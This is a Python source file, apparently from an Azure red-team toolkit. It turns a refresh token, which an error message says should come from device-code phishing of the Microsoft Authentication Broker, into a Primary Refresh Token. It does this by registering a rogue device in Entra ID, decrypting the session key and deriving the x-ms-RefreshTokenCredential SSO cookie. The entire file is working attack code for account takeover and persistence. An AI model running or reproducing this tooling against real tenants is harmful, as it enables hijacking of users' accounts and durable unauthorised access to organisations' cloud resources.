
import os
import json
import struct
import base64
import hashlib
import requests

BROKER_CLIENT_ID = "29d9ed98-a469-4536-ade2-f981bc1d605e"
DRS_RESOURCE = "urn:ms-drs:enterpriseregistration.windows.net"
DRS_ENROLL_URL = "https://enterpriseregistration.windows.net/EnrollmentServer/device/?api-version=1.0"
KDF_LABEL = b"AzureAD-SecureConversation"
WIN_VERSION = "10.0.19041.928"

class PRTError(Exception):
    pass

def _b64(data):
    return base64.b64encode(data).decode()

def _b64url_nopad_decode(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def _bcrypt_rsa_public_blob(public_key):
    nums = public_key.public_numbers()
    exp = nums.e.to_bytes((nums.e.bit_length() + 7) // 8, "big")
    mod = nums.n.to_bytes((nums.n.bit_length() + 7) // 8, "big")
    header = struct.pack("<IIIIII", 0x31415352, public_key.key_size, len(exp), len(mod), 0, 0)
    return header + exp + mod

def _require_crypto():
    try:
        import jwt
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, hmac, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa, padding
    except ImportError as e:
        raise PRTError(
            "The auto-PRT flow needs the 'cryptography' package (and PyJWT). "
            "Install it with: pip install cryptography"
        ) from e
    return {
        "jwt": jwt, "x509": x509, "NameOID": NameOID, "hashes": hashes,
        "hmac": hmac, "serialization": serialization, "rsa": rsa, "padding": padding,
    }

class PRTManager:

    def __init__(self, endpoint="microsoftonline.com", user_agent=None, rt_client_id=None, broker_client_id=None, log=print):
        self.endpoint = endpoint
        self.user_agent = user_agent
        self.rt_client_id = rt_client_id
        self.broker_client_id = broker_client_id or BROKER_CLIENT_ID
        self.log = log

    def _rt_clients(self):
        seen, out = set(), []
        for cid in (self.rt_client_id, self.broker_client_id):
            if cid and cid not in seen:
                seen.add(cid)
                out.append(cid)
        return out

    def _headers(self, extra=None):
        h = {"User-Agent": self.user_agent} if self.user_agent else {}
        if extra:
            h.update(extra)
        return h

    def _post(self, url, data=None, json_body=None, headers=None):
        try:
            return requests.post(url, data=data, json=json_body, headers=self._headers(headers))
        except Exception as e:
            raise PRTError(f"HTTP request to {url} failed: {e}") from e

    def _get_nonce(self):
        r = self._post(f"https://login.{self.endpoint}/common/oauth2/token",
                       data={"grant_type": "srv_challenge"})
        nonce = r.json().get("Nonce")
        if not nonce:
            raise PRTError(f"Could not obtain an ESTS nonce: {r.text}")
        return nonce

    def _refresh_to_resource(self, refresh_token, resource, tenant):
        errors = []
        for cid in self._rt_clients():
            attempts = (
                (f"https://login.{self.endpoint}/{tenant}/oauth2/v2.0/token",
                 {"grant_type": "refresh_token", "client_id": cid,
                  "refresh_token": refresh_token,
                  "scope": f"{resource}/.default offline_access openid"}),
                (f"https://login.{self.endpoint}/{tenant}/oauth2/token",
                 {"grant_type": "refresh_token", "client_id": cid,
                  "refresh_token": refresh_token, "resource": resource}),
            )
            for url, data in attempts:
                resp = self._post(url, data=data).json()
                if "access_token" in resp:
                    return resp["access_token"], resp.get("refresh_token") or refresh_token
                errors.append(f"[{cid} {'v2' if 'v2.0' in url else 'v1'}] "
                              f"{resp.get('error')}: {resp.get('error_description', resp)}")
        raise PRTError(
            f"Could not redeem the refresh token for '{resource}'. "
            "It must be a FOCI/broker refresh token (e.g. from device-code "
            "phishing the Microsoft Authentication Broker). Attempts:\n  "
            + "\n  ".join(errors)
        )

    def register_device(self, drs_access_token, device_name="", tenant="common", join_type=0):
        c = _require_crypto()
        rsa, hashes, x509, NameOID, serialization = (
            c["rsa"], c["hashes"], c["x509"], c["NameOID"], c["serialization"])

        device_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        csr = (x509.CertificateSigningRequestBuilder()
               .subject_name(x509.Name([x509.NameAttribute(
                   NameOID.COMMON_NAME, "7E980AD9-B86D-4306-9425-9AC066FB014A")]))
               .sign(device_key, hashes.SHA256()))
        csr_der = csr.public_bytes(serialization.Encoding.DER)

        transport_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        transport_pub_blob = _bcrypt_rsa_public_blob(transport_key.public_key())

        body = {
            "CertificateRequest": {"Type": "pkcs10", "Data": _b64(csr_der)},
            "TransportKey": _b64(transport_pub_blob),
            "TargetDomain": tenant,
            "DeviceType": "Windows",
            "OSVersion": WIN_VERSION,
            "DeviceDisplayName": device_name,
            "JoinType": join_type,
            "attributes": {"ReuseDevice": "true", "ReturnClientSid": "true"},
        }
        r = self._post(DRS_ENROLL_URL, json_body=body,
                       headers={"Authorization": f"Bearer {drs_access_token}"})
        data = r.json()
        cert_blob = (data.get("Certificate") or {}).get("RawBody")
        if not cert_blob:
            raise PRTError(f"Device registration failed: {json.dumps(data)}")
        import warnings
        with warnings.catch_warnings():
            warnings.simplefilter("ignore")
            cert = x509.load_der_x509_certificate(base64.b64decode(cert_blob))
        device_id = None
        try:
            device_id = cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value
        except Exception:
            pass
        return {"certificate": cert, "device_key": device_key,
                "transport_key": transport_key, "device_id": device_id}

    def request_prt(self, refresh_token, device):
        resp = self._prt_request_once(refresh_token, device, self.broker_client_id)
        if "refresh_token" not in resp or "session_key_jwe" not in resp:
            raise PRTError(f"PRT request failed [{self.broker_client_id}]: "
                           f"{resp.get('error')}: {resp.get('error_description', resp)}")
        session_key = self._decrypt_session_key(resp["session_key_jwe"], device["transport_key"])
        return resp["refresh_token"], session_key

    def _prt_request_once(self, refresh_token, device, client_id):
        c = _require_crypto()
        jwt, serialization = c["jwt"], c["serialization"]

        cert_der = device["certificate"].public_bytes(serialization.Encoding.DER)
        device_key_pem = device["device_key"].private_bytes(
            serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption())

        headers = {"alg": "RS256", "typ": "JWT", "x5c": [_b64(cert_der)]}
        payload = {
            "client_id": client_id,
            "request_nonce": self._get_nonce(),
            "scope": "openid aza ugs",
            "win_ver": WIN_VERSION,
            "grant_type": "refresh_token",
            "refresh_token": refresh_token,
        }
        signed = jwt.encode(payload, device_key_pem, algorithm="RS256", headers=headers)

        return self._post(
            f"https://login.{self.endpoint}/common/oauth2/token",
            data={
                "windows_api_version": "2.0",
                "grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
                "request": signed,
                "client_info": "1",
                "tgt": "true",
            },
        ).json()

    def _decrypt_session_key(self, jwe, transport_key):
        c = _require_crypto()
        padding, hashes = c["padding"], c["hashes"]
        encrypted_key = _b64url_nopad_decode(jwe.split(".")[1])
        return transport_key.decrypt(
            encrypted_key,
            padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA1()),
                         algorithm=hashes.SHA1(), label=None),
        )

    def _sp800_108(self, session_key, context):
        c = _require_crypto()
        hmac, hashes = c["hmac"], c["hashes"]
        h = hmac.HMAC(session_key, hashes.SHA256())
        h.update(b"\x00\x00\x00\x01" + KDF_LABEL + b"\x00" + context + b"\x00\x00\x01\x00")
        return h.finalize()

    def derive_cookie(self, prt, session_key, nonce=None):
        c = _require_crypto()
        jwt = c["jwt"]
        if nonce is None:
            nonce = self._get_nonce()

        context = os.urandom(24)
        headers = {"ctx": _b64(context), "kdf_ver": 2}
        payload = {"refresh_token": prt, "is_primary": "true", "request_nonce": nonce}

        jbody = jwt.encode(payload, os.urandom(32), algorithm="HS256", headers=headers).split(".")[1]
        kdf_context = hashlib.sha256(context + _b64url_nopad_decode(jbody)).digest()
        derived_key = self._sp800_108(session_key, kdf_context)

        return jwt.encode(payload, derived_key, algorithm="HS256", headers=headers)

    def mint_prt(self, refresh_token, tenant="common", device_name="AzureRedOps"):
        if not tenant:
            tenant = "common"
        self.log("Redeeming the refresh token for a device-registration (DRS) token.")
        drs_token, refresh_token = self._refresh_to_resource(refresh_token, DRS_RESOURCE, tenant)

        self.log("Registering a device with Azure AD (this writes a device object).")
        device = self.register_device(drs_token, device_name=device_name, tenant=tenant)
        if device.get("device_id"):
            self.log(f"Device registered: {device['device_id']}")

        self.log("Requesting a PRT + session key with the refresh token.")
        prt, session_key = self.request_prt(refresh_token, device)
        return {"prt": prt, "session_key": session_key, "device_id": device.get("device_id")}

    def mint_prt_cookie(self, refresh_token, tenant="common", device_name="AzureRedOps"):
        r = self.mint_prt(refresh_token, tenant, device_name)
        self.log("Deriving the x-ms-RefreshTokenCredential PRT cookie.")
        cookie = self.derive_cookie(r["prt"], r["session_key"])
        return {
            "prt": r["prt"],
            "session_key": _b64(r["session_key"]),
            "cookie": cookie,
            "device_id": r["device_id"],
        }